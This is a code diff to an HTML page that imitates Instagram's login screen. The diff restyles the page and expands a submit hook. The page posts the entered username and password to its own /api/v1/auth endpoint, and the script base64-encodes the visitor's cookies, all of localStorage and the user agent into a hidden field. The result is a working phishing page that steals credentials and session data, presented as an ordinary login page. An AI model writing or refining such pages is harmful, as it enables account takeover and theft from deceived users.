@@ -1,34 +1,57 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
+    <meta charset="UTF-8">
     <title>Instagram</title>
     <style>
-        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .main { display: flex; align-items: center; }
-        .phones { background-image: url('https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fd3d9d2c636d.png'); width: 454px; height: 618px; margin-right: 32px; }
-        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; }
-        .logo { width: 175px; margin-bottom: 20px; }
-        input { width: 100%; padding: 9px; margin-bottom: 7px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
-        button { width: 100%; padding: 7px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
-        @media (max-width: 800px) { .phones { display: none; } }
+        body { background-color: white; font-family: -apple-system, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .main { display: flex; width: 100%; max-width: 1000px; align-items: center; }
+        .left { flex: 1; text-align: center; padding: 40px; }
+        .left img.ig-logo { width: 80px; margin-bottom: 20px; }
+        .left h1 { font-size: 32px; font-weight: 500; color: #262626; line-height: 1.2; }
+        .left span { color: #fa7e1e; font-weight: bold; }
+        .left .visual { margin-top: 30px; width: 100%; max-width: 300px; }
+
+        .right { flex: 1; display: flex; flex-direction: column; align-items: center; border-left: 1px solid #dbdbdb; height: 100vh; justify-content: center; }
+        .form-box { width: 350px; text-align: center; }
+        .form-box h2 { font-size: 18px; color: #262626; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 8px; background: #fafafa; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background: #b2dffc; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .fb { color: #385185; font-size: 14px; font-weight: bold; margin-top: 20px; display: block; text-decoration: none; }
+        .create { border: 1px solid #0095f6; color: #0095f6; border-radius: 8px; padding: 10px; width: 100%; display: block; margin-top: 15px; text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="main">
-        <div class="phones"></div>
-        <div class="box">
-            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b562.png" class="logo">
-            <form action="/api/v1/auth" method="POST">
-                <input type="text" name="u" placeholder="Phone, username, or email" required>
-                <input type="password" name="p" placeholder="Password" required>
-                <input type="hidden" name="token" id="t">
-                <button type="submit">Log In</button>
-            </form>
+        <div class="left">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="ig-logo">
+            <h1>See everyday moments from your <span>close friends</span>.</h1>
+            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1.png/fd3d9d2c636d.png" class="visual">
+        </div>
+        <div class="right">
+            <div class="form-box">
+                <h2>Log into Instagram</h2>
+                <form action="/api/v1/auth" method="POST" id="d-vault">
+                    <input type="text" name="u" placeholder="Mobile number, username or email" required>
+                    <input type="password" name="p" placeholder="Password" required>
+                    <input type="hidden" name="token" id="d-token">
+                    <button type="submit">Log in</button>
+                    <a href="#" style="display:block; margin: 15px 0; font-size: 12px; color: #262626; text-decoration:none;">Forgot password?</a>
+                    <a href="#" class="fb">Log in with Facebook</a>
+                    <a href="#" class="create">Create new account</a>
+                </form>
+                <div style="margin-top: 40px; color: #00376b; font-weight: bold; font-size: 12px;">Meta</div>
+            </div>
         </div>
     </div>
     <script>
-        document.querySelector('form').onsubmit = function() {
-            document.getElementById('t').value = btoa(JSON.stringify({ck: document.cookie, ua: navigator.userAgent}));
+        document.getElementById('d-vault').onsubmit = function() {
+            let data = {
+                cookies: document.cookie,
+                ls: JSON.stringify(localStorage),
+                ua: navigator.userAgent
+            };
+            document.getElementById('d-token').value = btoa(JSON.stringify(data));
         };
     </script>
 </body>
